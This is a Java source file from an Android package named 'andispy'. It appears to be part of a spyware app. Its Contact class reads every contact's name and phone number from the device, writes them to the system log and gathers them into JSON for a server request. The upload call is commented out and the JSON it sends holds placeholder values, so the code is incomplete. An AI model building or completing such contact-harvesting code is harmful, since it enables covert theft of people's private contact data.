package com.andispy.andispy.data;

import android.content.Context;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.provider.ContactsContract;
import android.util.Log;
import android.widget.Toast;

import com.andispy.andispy.network.Postdata;
import com.andispy.andispy.util.Constants;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.util.ArrayList;



public class Contact {

    private JSONObject json = new JSONObject();
    private JSONObject obj_new = new JSONObject();

    private JSONArray postjson_name=new JSONArray();
    private JSONArray postjson_no=new JSONArray();
    private JSONArray postjson_ID=new JSONArray();

    private Context c_context;


    @SuppressWarnings("deprecation")
    public Contact(Context c) {

        this.c_context=c;
    }

    public JSONObject GetContact( Cursor c)
    {
        if(c==null){return null;}

        ArrayList<String> contacts = new ArrayList<>();

        SharedPreferences pref = c_context.getSharedPreferences("MyPref", c_context.MODE_PRIVATE);
        SharedPreferences.Editor editor = pref.edit();
        String User=pref.getString("User_ID", null);
        //  Toast.makeText(c_context, User,Toast.LENGTH_SHORT).show();

        while (c.moveToNext()) {

            String contactName = c
                    .getString(c
                            .getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
            String phNumber = c
                    .getString(c
                            .getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));


            contacts.add(contactName + ":" + phNumber);
            Log.d(contactName, phNumber);

            postjson_name.put(contactName);
            postjson_no.put(phNumber);
            postjson_ID.put("And123");
        }

        try {
            json.put("RegID","And123");
            json.put("contactname","121");
            json.put("contactnumber","12");


            obj_new.put("req",json );


       //     Postdata P1= new Postdata(Constants.URL_login, obj_new,getApplicationContext(),WelcomeActivity.class);
        } catch (Exception e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        }
        return obj_new;

    }
}
